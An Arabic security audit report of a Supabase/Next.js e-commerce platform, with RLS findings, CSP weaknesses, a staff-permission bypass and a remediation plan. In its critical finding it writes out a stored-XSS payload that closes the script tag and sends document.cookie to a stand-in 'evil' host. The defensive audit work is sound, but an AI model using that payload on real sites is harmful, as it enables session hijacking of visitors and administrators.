# 06 — تدقيق الأمان (Security Audit) — Matjar متجر

**المُدقّق:** Senior Security Auditor
**التاريخ:** 2026-07-24
**النطاق:** قاعدة بيانات Supabase (`wesihatopiznatsyfxer`)، طبقة RLS، الدوال (`SECURITY DEFINER`)، وطبقة التطبيق (Next.js 16 / RSC).
**المنهجية:** `get_advisors` (security + performance) + استعراض كل السياسات في `pg_policies` جدولاً بجدول + فحص أجسام الدوال في `pg_proc` + قراءة ملفات الكود الحسّاسة.

> **ملاحظة منهجية:** هذا التدقيق فحص أجسام الدوال والسياسات فعلياً ولم يكتفِ بتحذيرات الـ advisor. أغلب تحذيرات الـ advisor (108 تحذير security) هي النمط العام لـ Supabase حول دوال `SECURITY DEFINER` القابلة للاستدعاء عبر REST — وهي مقصودة هنا وكل دالة منها تُطبّق تحقّق تفويض داخلي. الثغرة الحقيقية الوحيدة الخطيرة في طبقة التطبيق (XSS)، لا في الـ DB.

---

## 1. ملخّص الخطورة (Severity Summary)

| الخطورة | العدد | البنود |
|---|---|---|
| 🔴 **Critical** | 1 | XSS مُخزّن عبر حقن JSON-LD |
| 🟠 **High** | 2 | CSP يسمح بـ `script-src 'unsafe-inline'` (مُمكِّن الـ XSS) · صلاحيات الموظّفين غير مُطبّقة على الجداول المالية/الـ CRM |
| 🟡 **Medium** | 3 | حماية كلمات المرور المسرّبة معطّلة · إساءة استخدام طلبات الضيوف (Rate-limit ضعيف) · كتابة التخزين غير مُقيّدة بالمالك |
| 🟢 **Low** | 6 | `pg_trgm` في schema عام · مفاتيح أجنبية بلا فهارس (5) · سياسات permissive متعدّدة + initplan (perf) · 46 فهرس غير مستخدم · `style-src 'unsafe-inline'` · تعداد طلبات الضيوف/الاشتراكات |

**عدد الجداول المفحوصة:** 70 جدولاً في `public` — **كلها RLS مُفعّل + كلها لديها policy واحدة على الأقل** (لا يوجد جدول مفتوح على مصراعيه ولا جدول مقفول بالخطأ).

**النتيجة النهائية للأمان: 7.0 / 10** — أساس متين جداً (RLS شامل، نظافة `search_path`، إعادة حساب الأسعار في الخادم، منع تصعيد الصلاحيات)، تشوبه ثغرة XSS واحدة خطيرة وفجوة في نموذج صلاحيات الموظّفين.

---

## 2. النتائج التفصيلية

### 🔴 CRITICAL-1 — XSS مُخزّن عبر حقن JSON-LD (Stored XSS)

- **الملف/الدالة:** `src/lib/jsonld.ts:173-175` (`jsonLdScript`) + الاستدعاءات في `src/app/[lang]/(site)/store/[id]/page.tsx:585`، `src/app/[lang]/(site)/product/[id]/page.tsx:279`.
- **المشكلة:** الدالة `jsonLdScript(data)` = `JSON.stringify(data)` **بلا أي هروب (escaping)** لـ `<` أو `</script>`، ثم تُحقَن مباشرة عبر `dangerouslySetInnerHTML` في وسم `<script type="application/ld+json">`. القيم `store.name` و`store.description` و`product.name` **يتحكّم بها التاجر بالكامل**.
- **الخطورة:** 🔴 Critical.
- **سيناريو الاستغلال:**
  1. أي شخص يسجّل حساب merchant (تسجيل ذاتي مفتوح) ويُنشئ متجراً باسم:
     `</script><script>fetch('https://evil/c?'+document.cookie)</script>`
  2. `JSON.stringify` لا يهرّب `/` ولا `<`، فتخرج السلسلة `</script>` حرفياً داخل الوسم.
  3. مُحلّل HTML في المتصفّح يُنهي وسم الـ script مبكّراً وينفّذ الـ script المحقون.
  4. الصفحة **عامّة** (`store/[id]`) — تُنفَّذ لدى كل زائر بما فيهم الـ super_admin عند مراجعة المتجر → سرقة جلسة، تنفيذ إجراءات نيابة عن الضحية.
- **المُضاعِف:** الـ CSP يسمح بـ `script-src 'unsafe-inline'` (انظر HIGH-1)، فلا يوجد ما يوقف تنفيذ السكربت المحقون. الاختبار `src/lib/__tests__/jsonld.test.ts:53` يؤكّد أنه لا هروب مقصوداً.
- **الإصلاح المُوصى به:** هروب الأحرف الخطيرة داخل `jsonLdScript` قبل الحقن:
  ```ts
  export function jsonLdScript(data: unknown): string {
    return JSON.stringify(data).replace(/</g, "\\u003c").replace(/>/g, "\\u003e")
      .replace(/&/g, "\\u0026").replace(/ /g, "\\u2028").replace(/ /g, "\\u2029");
  }
  ```
  هذا يُبقي JSON-LD صالحاً لجوجل ويُبطل كسر الوسم. الأفضل إضافة اختبار يمرّر اسماً فيه `</script>`.

---

### 🟠 HIGH-1 — CSP يسمح `script-src 'unsafe-inline'` (بلا nonce)

- **الملف:** `next.config.ts:12`.
- **المشكلة:** `script-src 'self' 'unsafe-inline' https://va.vercel-scripts.com`. وجود `'unsafe-inline'` يُلغي عملياً حماية الـ CSP ضد XSS المحقون في inline scripts — وهو تحديداً ما يجعل CRITICAL-1 قابلاً للاستغلال بالكامل بدل أن يوقفه المتصفّح.
- **الخطورة:** 🟠 High (مُمكِّن مباشر للـ Critical).
- **السبب الجذري:** هناك سكربتات inline مشروعة (theme bootstrap و GTM في `src/app/[lang]/layout.tsx:88-100`) بلا nonce، فاضطُرّ المشروع لـ `unsafe-inline`.
- **الإصلاح المُوصى به:** الانتقال لنموذج **nonce-based CSP**: توليد nonce في `proxy.ts` لكل طلب، تمريره لكل السكربتات inline، واستبدال `'unsafe-inline'` بـ `'nonce-<value>' 'strict-dynamic'`. بديل مؤقت: نقل JSON-LD وكل السكربتات inline إلى بنية تسمح بالـ hashing (`'sha256-...'`).

---

### 🟠 HIGH-2 — صلاحيات الموظّفين (`store_staff.permissions`) غير مُطبّقة على الجداول المالية والـ CRM

- **السياسات/الدوال:** `can_manage_store(uuid)` مقابل `staff_can(uuid, perm)` — و RLS للجداول: `store_customers`, `pos_sales`, `pos_sale_items`, `stock_movements`, `store_expenses`, `store_suppliers`, `supplier_transactions`, `store_tasks`, `checkout_intents`.
- **المشكلة:** الدالة `can_manage_store` تُرجِع `true` لأي عضو موجود في `store_staff` **بغضّ النظر عن حقل `permissions`**:
  ```sql
  -- can_manage_store: owner OR (أي صفّ في store_staff) — لا يقرأ permissions إطلاقاً
  or exists (select 1 from public.store_staff st
             where st.store_id = p_store_id and st.user_id = auth.uid());
  ```
  بينما `staff_can` (التي *تحترم* الصلاحيات) مستخدمة **فقط** على جدول `orders`. كل الجداول المالية والـ CRM أعلاه تستخدم `can_manage_store`.
- **الخطورة:** 🟠 High.
- **سيناريو الاستغلال:** تاجر يُضيف موظّفاً ويمنحه صلاحية "الطلبات" فقط (`permissions = {"orders": true}`). عملياً يحصل هذا الموظّف على **صلاحية ALL** (قراءة/كتابة/حذف) على: بيانات عملاء المتجر (PII: أسماء، هواتف)، مبيعات الـ POS، المصاريف، بيانات الموردين ومعاملاتهم، حركات المخزون، ونوايا الشراء (هواتف العملاء). هذا يكسر نموذج الصلاحيات المُعلَن ويكشف بيانات مالية و PII لموظّف لم يُمنح إليها.
- **الإصلاح المُوصى به:** استبدال `can_manage_store(store_id)` بـ `staff_can(store_id, '<section>')` في سياسات هذه الجداول (مثل `staff_can(store_id,'customers')`, `staff_can(store_id,'finance')`، إلخ)، مع إبقاء المالك دائماً مسموحاً (وهو مضمون داخل `staff_can`).

---

### 🟡 MEDIUM-1 — حماية كلمات المرور المسرّبة معطّلة

- **المصدر:** `get_advisors(security)` → `auth_leaked_password_protection`.
- **المشكلة:** فحص Supabase Auth ضد قاعدة HaveIBeenPwned معطّل، فيُسمح للمستخدمين باختيار كلمات مرور مسرّبة معروفة.
- **الخطورة:** 🟡 Medium.
- **سيناريو الاستغلال:** حشو بيانات اعتماد (credential stuffing) — مستخدم يعيد استخدام كلمة مرور مسرّبة، فيصبح حسابه (وربما متجره وبيانات عملائه) عرضة للاختراق.
- **الإصلاح:** تفعيل الخيار من لوحة Supabase: Authentication → Policies → Leaked Password Protection. (إجراء لوحة تحكّم — لا كود). [التوثيق](https://supabase.com/docs/guides/auth/password-security).

---

### 🟡 MEDIUM-2 — إساءة استخدام طلبات الضيوف / نوايا الشراء (Rate-limit ضعيف، لا حدّ IP)

- **الدوال:** `place_guest_order(...)` و`guard_guest_order_rate()` و`record_checkout_intent(...)` — كلها قابلة للاستدعاء بواسطة `anon` عبر REST.
- **المشكلة:** الحدّ الوحيد للمعدّل مبنيّ على **رقم الهاتف** الذي يتحكّم به المهاجم بالكامل: `place_guest_order` يمنع 5 طلبات/ساعة لنفس `phone` لكل متجر، والـ trigger يمنع 8/ساعة على الهاتف المُطبَّع. لا يوجد حدّ لكل IP ولا حدّ عام. `store_id` عامّ ومعروف (الصفحات عامّة).
- **الخطورة:** 🟡 Medium (لا يوجد كشف بيانات — إساءة توفّر/إزعاج).
- **سيناريو الاستغلال:** مهاجم يُدوّر أرقام هواتف وهمية ويُنشئ آلاف الطلبات المعلّقة على أي متجر → تلويث جدول `orders`، إغراق التاجر بإشعارات، تضخيم قاعدة البيانات. الإيجابيات: الأسعار تُعاد حسابها في الخادم (لا احتيال سعري) والمخزون لا يُخصم في طلب الضيف.
- **الإصلاح المُوصى به:** إضافة حدّ معدّل على مستوى الحافة (Vercel/edge) قائم على IP قبل الوصول للـ RPC، وحدّ عام لكل متجر (مثلاً X طلب ضيف/ساعة بصرف النظر عن الهاتف)، و CAPTCHA خفيف عند تجاوز عتبة.

---

### 🟡 MEDIUM-3 — كتابة التخزين غير مُقيّدة بالمالك/المسار

- **السياسة:** `storage.objects` → `store_assets_auth_insert`.
- **المشكلة:** سياسة الإدراج تتحقّق فقط من `bucket_id = 'store-assets'` بلا أي تقييد على المسار أو المالك:
  ```sql
  -- INSERT with_check: (bucket_id = 'store-assets')  ← لا فحص مجلّد/ملكية
  ```
  أي مستخدم مُصادَق يستطيع رفع عدد غير محدود من الصور (حتى 5MB لكلٍّ) إلى **أي مسار**. الحذف/التعديل مُقيّدان بالمالك (`owner = auth.uid()`) — جيّد.
- **الخطورة:** 🟡 Medium (إساءة تكلفة/تخزين). مُخفَّف: الـ bucket يفرض `allowed_mime_types = image/* فقط` (بدون SVG → لا XSS عبر رفع الصور) وحدّ 5MB على مستوى الخادم، والأسماء UUID عشوائية.
- **الإصلاح:** تقييد مسار الإدراج بحيث يبدأ بمعرّف يملكه المستخدم (مثل `(storage.foldername(name))[1] = auth.uid()::text`) أو ربطه بمتجر يملكه، لمنع الرفع العشوائي وإساءة التكلفة.

---

### 🟢 LOW — بنود متفرّقة

**LOW-1 — امتداد `pg_trgm` في schema `public`** (`extension_in_public`). أفضل ممارسة نقله إلى schema مخصّص (`extensions`). أثر أمني ضئيل. [التوثيق](https://supabase.com/docs/guides/database/database-linter?lint=0014_extension_in_public).

**LOW-2 — تعداد طلبات الضيوف / اشتراكات الدفع.** `get_guest_order(order_id, phone)` محميّة بـ UUID (غير قابل للتخمين) + مطابقة هاتف؛ و`get_push_subs(uid, secret)` محميّة بسرّ من `private.app_config`. كلاهما مكشوف لـ `anon` لكن التحقّق الداخلي سليم. الخطر الوحيد لو تسرّب السرّ/الـ UUID. يُنصح بتدوير `push_hook_secret` دورياً.

**LOW-3 — 5 مفاتيح أجنبية بلا فهارس مُغطّية** (`unindexed_foreign_keys`, perf): `automation_runs.automation_id`، `loyalty_ledger.order_id`، `loyalty_ledger.store_id`، `order_events.actor_id`، `products.section_id`. إضافة فهارس تحسّن الأداء عند النمو.

**LOW-4 — سياسات permissive متعدّدة + `auth_rls_initplan`** (perf): 25 جدولاً لديها سياستا SELECT (نمط admin + owner/public) — مقصود لكنه يُقيّم كلتا السياستين. و`business_leaders_submit` تستدعي `auth.<fn>()` لكل صفّ — يُستبدل بـ `(select auth.<fn>())`. لاحظ أن أغلب الدوال بالفعل تستخدم `(select auth.uid())` — نظافة ممتازة عموماً.

**LOW-5 — 46 فهرساً غير مستخدم** (`unused_index`, perf/كلفة): مراجعتها وحذف غير الضروري لتقليل حِمل الكتابة والتخزين (بعضها قد يكون لميزات لم تُطلَق بعد — لا تُحذف عمياءً).

**LOW-6 — `style-src 'unsafe-inline'`** في الـ CSP (`next.config.ts:13`): يسمح بحقن CSS inline. أثر أقل بكثير من script، شائع مع Tailwind، لكن يُفضّل الانتقال لـ hashing/nonce مستقبلاً.

---

## 3. ما هو مُحكَم فعلاً (نقاط القوّة — موثّقة)

هذه ليست مجاملة — تحقّقت منها في الكود/الـ DB وهي أعلى من متوسّط السوق:

1. **RLS شامل:** كل الـ 70 جدولاً في `public` عليها RLS + policy واحدة على الأقل. لا جدول مكشوف. الجداول الحسّاسة التي بلا سياسة كتابة (`order_payments`, `audit_logs`, `hub_tool_events`) مقفولة عمداً وتُكتَب فقط عبر دوال `SECURITY DEFINER` مُدقّقة.
2. **نظافة `search_path`:** 99 دالة `SECURITY DEFINER` من 103 تستخدم `search_path=''` (والباقي `= public`)، ما يُبطل هجمات اختطاف الـ search_path. **صفر دالة بلا `search_path`.**
3. **منع تصعيد الصلاحيات مُحكَم:** رغم أن `profiles_update` يسمح بتعديل صفّ المستخدم لنفسه، فإن الـ triggers `prevent_role_change` و`prevent_admin_perm_change` تُعيد قيم `role` و`admin_permissions` و`is_active` القديمة لأي غير super_admin. جرّبتُ المنطق: **لا يمكن للمستخدم رفع نفسه إلى super_admin.**
4. **`handle_new_user` لا يثق بالبيانات الوصفية:** `account_type` من المستخدم يُترجَم فقط إلى `merchant` أو `customer` — لا مسار لحقن `super_admin` عبر `signUp`.
5. **إعادة حساب الأسعار في الخادم:** `place_guest_order`, `place_customer_order`, `pos_record_sale` كلها تتجاهل الأسعار الواردة من العميل وتقرأها من `products` — لا احتيال سعري. وتُطبّق `validate_coupon` و`store_locations` والتحقّق من ملكية العميل للـ POS.
6. **عزل المتاجر سليم:** كل جداول المتاجر مُقيّدة بـ `store_id` عبر `can_manage_store`/`staff_can`؛ العملاء يرون طلباتهم فقط؛ الرسائل عبر `is_conversation_participant`؛ `profiles` مقصورة على الذات؛ المسوّدات مخفيّة (`academy_guides`/`site_pages` بشرط `published=true`، `listings`/`gigs`/`job_postings` بشرط `status='active'` أو الملكية).
7. **لا مفتاح `service_role` في كود العميل:** فحص كامل — لا وجود لـ `service_role`/`SERVICE_ROLE` في `src/`. فقط anon key (المُصمَّم للعرض العلني). لا `dangerouslySetInnerHTML` إلا لـ JSON-LD (المشكلة أعلاه) وسكربتات bootstrap ثابتة.
8. **رؤوس أمنية جيّدة:** `X-Frame-Options: SAMEORIGIN`، `X-Content-Type-Options: nosniff`، `Referrer-Policy` مضبوط، `Permissions-Policy` بأقلّ صلاحية، `object-src 'none'`، `frame-ancestors/base-uri/form-action 'self'`. الـ bucket يستبعد SVG من أنواع MIME المسموحة (يمنع XSS عبر الصور).
9. **بوّابة admin دفاع-في-العمق:** `admin/layout.tsx` تفحص `role`/`admin_permissions` وتُعيد التوجيه، مع بقاء RLS (`admin_can(section)`) هو الفارض الحقيقي على الكتابات. دوال التقارير الإدارية (`admin_orders_report`, `store_report`, `send_store_campaign`) كلها تبدأ بتحقّق `is_super_admin()`/`can_manage_store()` وترفع استثناءً عند الفشل.

---

## 4. خطة المعالجة المُرتّبة بالأولوية

| # | البند | الخطورة | الجهد | الإجراء |
|---|---|---|---|---|
| 1 | هروب `jsonLdScript` | 🔴 Critical | دقائق | تعديل `src/lib/jsonld.ts` + اختبار |
| 2 | صلاحيات الموظّفين على الجداول المالية/CRM | 🟠 High | متوسط | استبدال `can_manage_store` بـ `staff_can(...,section)` في ~9 سياسات |
| 3 | CSP nonce-based بدل `unsafe-inline` | 🟠 High | متوسط | nonce في `proxy.ts` + تمريره للسكربتات |
| 4 | تفعيل حماية كلمات المرور المسرّبة | 🟡 Medium | دقيقة | لوحة Supabase (لا كود) |
| 5 | حدّ معدّل IP لطلبات الضيوف | 🟡 Medium | متوسط | edge rate-limit + حدّ عام لكل متجر |
| 6 | تقييد مسار كتابة التخزين بالمالك | 🟡 Medium | صغير | تعديل سياسة `store_assets_auth_insert` |
| 7 | فهارس FK + نقل `pg_trgm` + تنظيف الفهارس | 🟢 Low | صغير | migrations (perf/كلفة) |

---

*انتهى تدقيق الأمان. لم يُعدّل أي كود أثناء هذا التدقيق — قراءة فقط.*
